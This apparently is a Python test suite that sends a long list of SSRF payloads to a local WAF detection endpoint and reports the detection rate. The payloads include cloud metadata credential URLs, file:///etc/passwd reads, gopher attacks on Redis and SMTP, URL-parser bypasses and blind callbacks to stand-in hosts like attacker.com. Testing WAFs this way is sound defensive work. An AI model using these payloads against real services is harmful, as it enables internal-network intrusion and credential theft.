#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) Attack Test Suite
Tests SSRF techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# SSRF Attack Payloads
SSRF_ATTACKS = [
    # Basic SSRF - Internal Networks
    {"name": "Localhost HTTP", "path": "/api/fetch", "query": {"url": "http://127.0.0.1/admin"}},
    {"name": "Localhost alt", "path": "/api/proxy", "query": {"target": "http://localhost/secret"}},
    {"name": "IPv6 localhost", "path": "/api/get", "query": {"url": "http://[::1]/"}},
    {"name": "Decimal IP", "path": "/api/request", "query": {"endpoint": "http://2130706433/"}},
    {"name": "Octal IP", "path": "/api/load", "query": {"src": "http://0177.0.0.1/"}},
    {"name": "Hex IP", "path": "/api/import", "query": {"url": "http://0x7f000001/"}},
    {"name": "Mixed notation", "path": "/api/curl", "query": {"url": "http://127.1/admin"}},

    # Internal Network Scanning
    {"name": "Internal 10.x", "path": "/api/scan", "query": {"host": "http://10.0.0.1/"}},
    {"name": "Internal 172.x", "path": "/api/check", "query": {"target": "http://172.16.0.1/"}},
    {"name": "Internal 192.168.x", "path": "/api/probe", "query": {"url": "http://192.168.1.1/"}},
    {"name": "Docker network", "path": "/api/docker", "query": {"host": "http://172.17.0.1/"}},
    {"name": "Kubernetes service", "path": "/api/k8s", "query": {"svc": "http://kubernetes.default.svc/"}},

    # Cloud Metadata Services
    {"name": "AWS metadata", "path": "/api/cloud", "query": {"url": "http://169.254.169.254/latest/meta-data/"}},
    {"name": "AWS IAM creds", "path": "/api/aws", "query": {"endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}},
    {"name": "AWS user-data", "path": "/api/init", "query": {"url": "http://169.254.169.254/latest/user-data/"}},
    {"name": "GCP metadata", "path": "/api/gcp", "query": {"url": "http://metadata.google.internal/computeMetadata/v1/"}},
    {"name": "Azure metadata", "path": "/api/azure", "query": {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}},
    {"name": "DigitalOcean metadata", "path": "/api/do", "query": {"url": "http://169.254.169.254/metadata/v1/"}},
    {"name": "Oracle Cloud metadata", "path": "/api/oci", "query": {"url": "http://169.254.169.254/opc/v1/instance/"}},
    {"name": "Alibaba Cloud metadata", "path": "/api/aliyun", "query": {"url": "http://100.100.100.200/latest/meta-data/"}},

    # Protocol Smuggling
    {"name": "File protocol", "path": "/api/read", "query": {"url": "file:///etc/passwd"}},
    {"name": "Dict protocol", "path": "/api/dict", "query": {"url": "dict://localhost:11211/stats"}},
    {"name": "Gopher Redis", "path": "/api/cache", "query": {"url": "gopher://127.0.0.1:6379/_INFO"}},
    {"name": "Gopher SMTP", "path": "/api/mail", "query": {"url": "gopher://127.0.0.1:25/_MAIL%20FROM:attacker"}},
    {"name": "LDAP protocol", "path": "/api/ldap", "query": {"url": "ldap://localhost:389/"}},
    {"name": "FTP protocol", "path": "/api/ftp", "query": {"url": "ftp://localhost/etc/passwd"}},
    {"name": "TFTP protocol", "path": "/api/tftp", "query": {"url": "tftp://localhost/etc/passwd"}},

    # DNS Rebinding
    {"name": "DNS rebind attack", "path": "/api/resolve", "query": {"host": "http://rebind.attacker.com/"}},
    {"name": "DNS rebind localhost", "path": "/api/lookup", "query": {"url": "http://localtest.me/admin"}},
    {"name": "DNS rebind internal", "path": "/api/dns", "query": {"target": "http://1.2.3.4.xip.io/"}},

    # URL Bypass Techniques
    {"name": "URL fragment bypass", "path": "/api/url", "query": {"url": "http://evil.com#@127.0.0.1/"}},
    {"name": "URL userinfo bypass", "path": "/api/auth", "query": {"url": "http://127.0.0.1@evil.com/"}},
    {"name": "URL username bypass", "path": "/api/login", "query": {"url": "http://evil.com:80@127.0.0.1/"}},
    {"name": "Double URL encoding", "path": "/api/encode", "query": {"url": "http://127.0.0.1%252f"}},
    {"name": "Unicode bypass", "path": "/api/unicode", "query": {"url": "http://127。0。0。1/"}},
    {"name": "Punycode bypass", "path": "/api/puny", "query": {"url": "http://xn--nxasmq5b/"}},
    {"name": "URL shortener", "path": "/api/short", "query": {"url": "https://bit.ly/internal-admin"}},

    # Port Scanning via SSRF
    {"name": "Port scan SSH", "path": "/api/port", "query": {"target": "http://127.0.0.1:22/"}},
    {"name": "Port scan MySQL", "path": "/api/db", "query": {"host": "http://127.0.0.1:3306/"}},
    {"name": "Port scan Redis", "path": "/api/redis", "query": {"url": "http://127.0.0.1:6379/"}},
    {"name": "Port scan Memcached", "path": "/api/memcached", "query": {"url": "http://127.0.0.1:11211/"}},
    {"name": "Port scan MongoDB", "path": "/api/mongo", "query": {"url": "http://127.0.0.1:27017/"}},
    {"name": "Port scan Elasticsearch", "path": "/api/elastic", "query": {"url": "http://127.0.0.1:9200/"}},

    # Blind SSRF
    {"name": "Blind SSRF callback", "path": "/api/webhook", "body": {"callback_url": "http://attacker.com/log"}},
    {"name": "Blind SSRF OOB DNS", "path": "/api/notify", "body": {"url": "http://ssrf.attacker.com/"}},
    {"name": "Blind SSRF time-based", "path": "/api/async", "body": {"endpoint": "http://10.0.0.1:22/"}},

    # SSRF in Different Contexts
    {"name": "PDF generator SSRF", "path": "/api/pdf/generate", "body": {"html": "<iframe src='http://169.254.169.254/'>"}},
    {"name": "Image processing SSRF", "path": "/api/image/resize", "query": {"url": "http://127.0.0.1/admin.png"}},
    {"name": "Webhook SSRF", "path": "/api/webhook/register", "body": {"url": "http://localhost:8080/internal"}},
    {"name": "OAuth callback SSRF", "path": "/api/oauth/callback", "query": {"redirect_uri": "http://127.0.0.1/admin"}},
    {"name": "Import URL SSRF", "path": "/api/import", "body": {"source_url": "http://169.254.169.254/"}},
    {"name": "Avatar URL SSRF", "path": "/api/profile/avatar", "body": {"avatar_url": "http://localhost/admin"}},

    # SSRF via Headers
    {"name": "X-Forwarded-Host SSRF", "path": "/api/redirect", "headers": {"X-Forwarded-Host": "127.0.0.1"}},
    {"name": "Host header SSRF", "path": "/api/virtual", "headers": {"Host": "internal-api.local"}},
    {"name": "X-Original-URL SSRF", "path": "/api/route", "headers": {"X-Original-URL": "http://127.0.0.1/admin"}},
    {"name": "Referer SSRF", "path": "/api/analytics", "headers": {"Referer": "http://169.254.169.254/"}},

    # SSRF Filter Bypass
    {"name": "Redirect bypass", "path": "/api/follow", "query": {"url": "http://evil.com/redirect?to=http://127.0.0.1"}},
    {"name": "Short URL bypass", "path": "/api/expand", "query": {"url": "https://tinyurl.com/internal"}},
    {"name": "Base64 bypass", "path": "/api/b64", "query": {"url": "aHR0cDovLzEyNy4wLjAuMS8="}},
    {"name": "Double encoding bypass", "path": "/api/decode", "query": {"url": "%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f"}},
    {"name": "Null byte bypass", "path": "/api/null", "query": {"url": "http://evil.com%00.127.0.0.1/"}},

    # Hidden in legitimate requests
    {"name": "Import spreadsheet SSRF", "path": "/api/sheets/import", "body": {"url": "http://10.0.0.1/data.csv", "format": "csv"}},
    {"name": "Video thumbnail SSRF", "path": "/api/video/thumbnail", "body": {"video_url": "http://169.254.169.254/"}},
    {"name": "RSS feed SSRF", "path": "/api/rss/subscribe", "body": {"feed_url": "http://127.0.0.1:6379/"}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single SSRF payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Content-Type": "application/json",
            **(attack.get("headers", {}))
        }
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("SERVER-SIDE REQUEST FORGERY (SSRF) ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(SSRF_ATTACKS)} SSRF payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(SSRF_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(SSRF_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(SSRF_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(SSRF_ATTACKS) - errors) * 100 if (len(SSRF_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
